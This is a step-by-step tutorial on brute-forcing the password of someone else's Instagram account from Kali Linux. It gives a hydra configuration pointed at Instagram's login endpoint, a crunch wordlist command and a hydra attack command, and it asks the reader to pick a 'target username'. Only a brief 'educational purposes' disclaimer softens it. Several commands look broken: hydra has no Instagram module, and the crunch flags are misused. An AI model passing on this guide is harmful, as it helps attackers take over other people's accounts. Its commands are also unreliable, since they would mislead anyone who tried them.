## Prerequisites

1. **Kali Linux 2024 (or later)** installed on your system.
2. Basic understanding of Linux commands.
3. A test Instagram account (create a new account for this purpose).

## Installation

1. Open a terminal in Kali Linux and update the package list:
   ```bash
   sudo apt update
   ```

2. Install `hydra`:
   ```bash
   sudo apt install hydra
   ```

3. Install `instagram-python`:
   ```bash
   sudo pip install instagram-python
   ```

## Step 1: Gather Information

1. Create a new Instagram account for testing purposes.
2. Note down the username and password for this account.
3. Identify the target username (the account you want to brute force).

## Step 2: Configure Hydra

1. Create a new file called `hydra.conf` with the following contents:
   ```bash
   # Hydra configuration file

   # Target username
   TARGET_USERNAME = "target_username"

   # Target password file (we'll create this later)
   PASSWORD_FILE = "/path/to/passwords.txt"

   # Instagram login URL
   LOGIN_URL = "https://www.instagram.com/accounts/login/ajax/"

   # Instagram login headers
   LOGIN_HEADERS = {
       "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
       "Content-Type": "application/x-www-form-urlencoded"
   }

   # Instagram login data
   LOGIN_DATA = {
       "username": TARGET_USERNAME,
       "password": ""
   }
   ```
   Replace `target_username` with the target username.

## Step 3: Generate Password List

1. Create a new file called `passwords.txt` with a list of potential passwords. You can use a tool like `crunch` to generate a password list:
   ```bash
   crunch 8 12 -f /usr/share/wordlists/rockyou.txt -o passwords.txt
   ```
   This will generate a list of 8-12 character passwords from the RockYou wordlist.

## Step 4: Run Hydra

1. Run the following command to start the brute force attack:
   ```bash
   hydra -l TARGET_USERNAME -P /path/to/passwords.txt -s 443 -f instagram -e ns -m 100 instagram.com
   ```
   Replace `/path/to/passwords.txt` with the actual path to your password list.

## Important Notes

- This is a basic example and may not work due to Instagram's rate limiting and security measures.
- Brute forcing passwords is a time-consuming and resource-intensive process.
- This tutorial is for educational purposes only, and I strongly advise against using this technique for malicious activities.

## Conclusion

In this tutorial, we've covered the basics of performing an Instagram password brute force attack using Kali Linux. Remember that this technique should only be used for educational purposes, and I encourage you to focus on improving your own password security.
